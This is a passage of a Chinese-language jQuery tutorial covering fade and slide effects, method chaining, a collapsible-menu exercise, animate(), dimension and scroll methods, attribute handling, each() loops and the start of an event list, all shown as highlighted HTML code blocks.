class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h2 id="10-6-jquery特殊效果"><a href="#10-6-jquery特殊效果" class="headerlink" title="10.6 jquery特殊效果"></a>10.6 jquery特殊效果</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fadeIn() 淡入</span><br><span class="line"></span><br><span class="line">    $btn.click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        $(<span class="string">'#div1'</span>).fadeIn(<span class="number">1000</span>,<span class="string">'swing'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">'done!'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">fadeOut() 淡出</span><br><span class="line">fadeToggle() 切换淡入淡出</span><br><span class="line">hide() 隐藏元素</span><br><span class="line">show() 显示元素</span><br><span class="line">toggle() 切换元素的可见状态</span><br><span class="line">slideDown() 向下展开</span><br><span class="line">slideUp() 向上卷起</span><br><span class="line">slideToggle() 依次展开或卷起某个元素</span><br></pre></td></tr></table></figure><h2 id="10-7-jquery链式调用"><a href="#10-7-jquery链式调用" class="headerlink" title="10.7 jquery链式调用"></a>10.7 jquery链式调用</h2><p>jquery对象的方法会在执行完后返回这个jquery对象，所有jquery对象的方法可以连起来写：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#div1'</span>) <span class="comment">// id为div1的元素</span></span><br><span class="line">.children(<span class="string">'ul'</span>) <span class="comment">//该元素下面的ul子元素</span></span><br><span class="line">.slideDown(<span class="string">'fast'</span>) <span class="comment">//高度从零变到实际高度来显示ul元素</span></span><br><span class="line">.parent()  <span class="comment">//跳到ul的父元素，也就是id为div1的元素</span></span><br><span class="line">.siblings()  <span class="comment">//跳到div1元素平级的所有兄弟元素</span></span><br><span class="line">.children(<span class="string">'ul'</span>) <span class="comment">//这些兄弟元素中的ul子元素</span></span><br><span class="line">.slideUp(<span class="string">'fast'</span>);  <span class="comment">//高度实际高度变换到零来隐藏ul元素</span></span><br></pre></td></tr></table></figure><p>课堂练习 - 层级菜单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $(<span class="string">'.level1'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">//当前点击的元素紧挨的同辈元素向下展开，再跳到此元素的父级(li),再跳到此父级的其他的同辈元素(li),选择其他同辈元素(li)的子元素ul，然后将它向上收起。</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 通过stop() 可以修正反复点击导致的持续动画的问题</span></span></span><br><span class="line"><span class="javascript">                $(<span class="keyword">this</span>).next().stop().slideToggle().parent().siblings().children(<span class="string">'ul'</span>).slideUp();</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="undefined">        </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">        body &#123;</span></span><br><span class="line"><span class="undefined">            font-family: 'Microsoft Yahei';</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        body, ul &#123;</span></span><br><span class="line"><span class="undefined">            margin: 0px;</span></span><br><span class="line"><span class="undefined">            padding: 0px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        ul &#123;</span></span><br><span class="line"><span class="undefined">            list-style: none;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> &#123;</span></span><br><span class="line"><span class="undefined">            width: 200px;</span></span><br><span class="line"><span class="undefined">            margin: 20px auto 0;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-class">.level1</span>, <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="undefined">            display: block;</span></span><br><span class="line"><span class="undefined">            width: 200px;</span></span><br><span class="line"><span class="undefined">            height: 30px;</span></span><br><span class="line"><span class="undefined">            line-height: 30px;</span></span><br><span class="line"><span class="undefined">            text-decoration: none;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#3366cc</span>;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;</span></span><br><span class="line"><span class="undefined">            font-size: 16px;</span></span><br><span class="line"><span class="undefined">            text-indent: 10px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-class">.level1</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#afc6f6</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="undefined">            font-size: 14px;</span></span><br><span class="line"><span class="undefined">            text-indent: 20px;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#7aa1ef</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">border-bottom</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#afc6f6</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="undefined">            display: none;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span><span class="selector-class">.current</span> &#123;</span></span><br><span class="line"><span class="undefined">            display: block;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.menu</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#f6b544</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"level1"</span>&gt;</span>水果<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"current"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>梨子<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>葡萄<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>火龙果<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"level1"</span>&gt;</span>海鲜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>蛏子<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>扇贝<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>龙虾<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>象拔蚌<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"level1"</span>&gt;</span>肉类<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>内蒙古羊肉<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>进口牛肉<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>野猪肉<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"level1"</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>娃娃菜<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>西红柿<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>西芹<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>胡萝卜<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">class</span>=<span class="string">"level1"</span>&gt;</span>速冻<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>冰淇淋<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>湾仔码头<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>海参<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>牛肉丸<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-8-jquery动画"><a href="#10-8-jquery动画" class="headerlink" title="10.8 jquery动画"></a>10.8 jquery动画</h2><p>通过animate方法可以设置元素某属性值上的动画，可以设置一个或多个属性值，动画执行完成后会执行一个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#div1'</span>).animate(&#123;</span><br><span class="line">    width:<span class="number">300</span>,</span><br><span class="line">    height:<span class="number">300</span></span><br><span class="line">&#125;,<span class="number">1000</span>,<span class="string">'swing'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'done!'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>参数可以写成数字表达式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#div1'</span>).animate(&#123;</span><br><span class="line">    width:<span class="string">'+=100'</span>,</span><br><span class="line">    height:<span class="number">300</span></span><br><span class="line">&#125;,<span class="number">1000</span>,<span class="string">'swing'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'done!'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="10-9-尺寸相关、滚动事件"><a href="#10-9-尺寸相关、滚动事件" class="headerlink" title="10.9 尺寸相关、滚动事件"></a>10.9 尺寸相关、滚动事件</h2><p>1、获取和设置元素的尺寸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">width()、height()    获取元素width和height  </span><br><span class="line">innerWidth()、innerHeight()  包括padding的width和height  </span><br><span class="line">outerWidth()、outerHeight()  包括padding和border的width和height  </span><br><span class="line">outerWidth(<span class="literal">true</span>)、outerHeight(<span class="literal">true</span>)   包括padding和border以及margin的width和height</span><br></pre></td></tr></table></figure><p>2、获取元素相对页面的绝对位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset()</span><br></pre></td></tr></table></figure><p>3、获取浏览器可视区宽度高度</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).width();</span><br><span class="line">$(<span class="built_in">window</span>).height();</span><br></pre></td></tr></table></figure><p>4、获取页面文档的宽度高度</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).width();</span><br><span class="line">$(<span class="built_in">document</span>).height();</span><br></pre></td></tr></table></figure><p>5、获取页面滚动距离</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).scrollTop();  </span><br><span class="line">$(<span class="built_in">document</span>).scrollLeft();</span><br></pre></td></tr></table></figure><p>6、页面滚动事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).scroll(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    ......  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="10-10-jquery属性操作"><a href="#10-10-jquery属性操作" class="headerlink" title="10.10 jquery属性操作"></a>10.10 jquery属性操作</h2><p>1、html() 取出或设置html内容</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取出html内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $htm = $(<span class="string">'#div1'</span>).html();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置html内容</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">'#div1'</span>).html(<span class="string">'&lt;span&gt;添加文字&lt;/span&gt;'</span>);</span><br></pre></td></tr></table></figure><p>2、prop() 取出或设置某个属性的值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取出图片的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $src = $(<span class="string">'#img1'</span>).prop(<span class="string">'src'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置图片的地址和alt属性</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">'#img1'</span>).prop(&#123;<span class="attr">src</span>: <span class="string">"test.jpg"</span>, <span class="attr">alt</span>: <span class="string">"Test Image"</span> &#125;);</span><br></pre></td></tr></table></figure><h2 id="10-11-jquery循环"><a href="#10-11-jquery循环" class="headerlink" title="10.11 jquery循环"></a>10.11 jquery循环</h2><p>对jquery选择的对象集合分别进行操作，需要用到jquery循环操作，此时可以用对象上的each方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">'.list li'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>).html(i);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">......</span><br><span class="line">&lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">    &lt;li&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-12-jquery事件"><a href="#10-12-jquery事件" class="headerlink" title="10.12 jquery事件"></a>10.12 jquery事件</h2><h3 id="10-12-1-事件函数列表："><a href="#10-12-1-事件函数列表：" class="headerlink" title="10.12.1 事件函数列表："></a>10.12.1 <strong>事件函数列表：</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span 